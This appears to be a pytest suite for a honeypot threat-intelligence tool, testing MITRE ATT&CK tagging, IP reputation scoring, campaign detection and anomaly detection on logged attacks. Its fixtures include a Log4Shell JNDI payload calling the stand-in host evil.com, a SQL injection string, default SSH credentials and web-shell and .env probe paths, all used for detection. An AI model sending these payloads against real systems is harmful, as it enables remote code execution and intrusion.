import sys
import os
import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from intelligence.mitre import tag_attack, tags_to_dicts, get_all_techniques
from intelligence.reputation import score_ip, score_to_level, rank_threats, detect_campaigns


class TestMitreTagging:

    def test_ssh_brute_force(self):
        attack = {"service": "ssh", "username": "root", "password": "123456"}
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1110.001" in ids

    def test_ssh_pi_spraying(self):
        attack = {"service": "ssh", "username": "pi", "password": "raspberry"}
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1110.001" in ids
        assert "T1110.003" in ids

    def test_http_sql_injection(self):
        attack = {
            "service": "http", "method": "GET",
            "path": "/search?q=1' UNION SELECT * FROM users--",
            "payload": "sql_injection",
        }
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1190" in ids

    def test_http_log4shell(self):
        attack = {
            "service": "http", "method": "GET",
            "path": "/",
            "payload": "${jndi:ldap://evil.com/x}",
            "user_agent": "${jndi:ldap://evil.com/x}",
        }
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1059.004" in ids
        assert "T1190" in ids

    def test_http_env_probe(self):
        attack = {"service": "http", "method": "GET", "path": "/.env", "payload": ""}
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1083" in ids

    def test_http_wordpress_brute(self):
        attack = {"service": "http", "method": "POST", "path": "/wp-login.php", "payload": "log=admin&pwd=pass"}
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1110.003" in ids

    def test_http_webshell(self):
        attack = {"service": "http", "method": "GET", "path": "/cgi-bin/shell.sh", "payload": ""}
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1505.003" in ids

    def test_ftp_login(self):
        attack = {"service": "ftp", "username": "admin", "password": "admin"}
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert "T1133" in ids
        assert "T1110.001" in ids

    def test_unknown_returns_fallback(self):
        attack = {"service": "ssh", "username": "unknown_user", "password": "unknown_pass"}
        tags = tag_attack(attack)
        assert len(tags) > 0

    def test_tags_to_dicts(self):
        attack = {"service": "ssh", "username": "root", "password": "123456"}
        tags = tag_attack(attack)
        dicts = tags_to_dicts(tags)
        assert isinstance(dicts, list)
        assert all("id" in d and "name" in d and "tactic" in d for d in dicts)

    def test_get_all_techniques(self):
        techniques = get_all_techniques()
        assert len(techniques) >= 10
        assert all("id" in t and "severity" in t for t in techniques)

    def test_no_duplicate_tags(self):
        attack = {
            "service": "http", "method": "POST",
            "path": "/wp-login.php",
            "payload": "${jndi:ldap://evil.com/x} UNION SELECT * FROM users",
        }
        tags = tag_attack(attack)
        ids = [t.id for t in tags]
        assert len(ids) == len(set(ids)), "Duplicate technique tags found"


class TestReputationScoring:

    def _make_attacks(self, n: int, service: str = "ssh",
                      username: str = "root", password: str = "123456",
                      hour: int = 14) -> list[dict]:
        from datetime import datetime, timedelta
        base = datetime(2024, 1, 15, hour, 0, 0)
        return [
            {
                "src_ip":    "1.2.3.4",
                "service":   service,
                "username":  username,
                "password":  password,
                "payload":   "",
                "timestamp": (base + timedelta(minutes=i)).isoformat(),
            }
            for i in range(n)
        ]

    def test_empty_ip(self):
        result = score_ip("1.2.3.4", [])
        assert result["score"] == 0
        assert result["level"] == "info"

    def test_low_volume(self):
        attacks = self._make_attacks(5)
        result = score_ip("1.2.3.4", attacks)
        assert result["score"] < 50

    def test_high_volume_scores_higher(self):
        low  = score_ip("1.2.3.4", self._make_attacks(5))
        high = score_ip("1.2.3.4", self._make_attacks(60))
        assert high["score"] > low["score"]

    def test_exploit_payload_increases_score(self):
        normal  = self._make_attacks(20)
        exploit = self._make_attacks(20)
        for a in exploit:
            a["payload"] = "rce_attempt: ${jndi:ldap://evil.com}"
        r_normal  = score_ip("1.2.3.4", normal)
        r_exploit = score_ip("1.2.3.4", exploit)
        assert r_exploit["score"] > r_normal["score"]

    def test_multi_service_increases_score(self):
        mono = self._make_attacks(20, service="ssh")
        multi = self._make_attacks(10, service="ssh") + self._make_attacks(10, service="http")
        r_mono  = score_ip("1.2.3.4", mono)
        r_multi = score_ip("1.2.3.4", multi)
        assert r_multi["score"] > r_mono["score"]

    def test_score_to_level(self):
        assert score_to_level(95)  == "critical"
        assert score_to_level(80)  == "high"
        assert score_to_level(60)  == "medium"
        assert score_to_level(30)  == "low"
        assert score_to_level(10)  == "info"

    def test_score_capped_at_100(self):
        attacks = self._make_attacks(500)
        for a in attacks:
            a["payload"] = "rce_attempt: exploit"
        result = score_ip("1.2.3.4", attacks)
        assert result["score"] <= 100

    def test_rank_threats(self):
        attacks = (
            self._make_attacks(60, service="ssh") +
            [{"src_ip": "5.6.7.8", "service": "http", "username": "", "password": "",
              "payload": "scan", "timestamp": "2024-01-15T10:00:00"}] * 3
        )
        ranked = rank_threats(attacks, top_n=5)
        assert len(ranked) <= 5
        assert ranked[0]["score"] >= ranked[-1]["score"]
        assert ranked[0]["ip"] == "1.2.3.4"

    def test_detect_campaigns(self):
        attacks = []
        for i in range(10):
            attacks.append({
                "src_ip": f"10.0.0.{i}",
                "service": "ssh",
                "username": "root",
                "password": "raspberry",
                "payload": "",
                "timestamp": "2024-01-15T10:00:00",
            })
        campaigns = detect_campaigns(attacks, threshold=5)
        assert len(campaigns) >= 1
        assert campaigns[0]["indicator"] == "raspberry"
        assert campaigns[0]["ip_count"] >= 5

    def test_no_campaigns_below_threshold(self):
        attacks = [
            {"src_ip": f"10.0.0.{i}", "service": "ssh",
             "username": "root", "password": f"pass{i}",
             "payload": "", "timestamp": "2024-01-15T10:00:00"}
            for i in range(4)
        ]
        campaigns = detect_campaigns(attacks, threshold=5)
        assert len(campaigns) == 0


class TestAnomalyDetector:

    def _make_normal_attacks(self, n: int = 100) -> list[dict]:
        from datetime import datetime, timedelta
        base = datetime(2024, 1, 15, 14, 0, 0)
        return [
            {
                "service":   "ssh",
                "username":  "root",
                "password":  "123456",
                "payload":   "",
                "path":      "",
                "timestamp": (base + timedelta(minutes=i)).isoformat(),
            }
            for i in range(n)
        ]

    def test_detector_predict_returns_dict(self):
        from ml.detector import AnomalyDetector
        detector = AnomalyDetector()
        attack = {"service": "ssh", "username": "root", "password": "123456",
                  "payload": "", "path": "", "timestamp": "2024-01-15T14:00:00"}
        result = detector.predict(attack)
        assert "score" in result
        assert "is_anomaly" in result
        assert "explanation" in result

    def test_detector_trains_and_predicts(self):
        from ml.detector import AnomalyDetector
        detector = AnomalyDetector()
        attacks = self._make_normal_attacks(50)
        detector.train(attacks)
        result = detector.predict(attacks[0])
        assert isinstance(result["score"], float)
        assert isinstance(result["is_anomaly"], bool)

    def test_untrained_detector_safe(self):
        from ml.detector import AnomalyDetector
        detector = AnomalyDetector()
        result = detector.predict({"service": "ssh", "timestamp": "2024-01-15T00:00:00"})
        assert result["is_anomaly"] is False
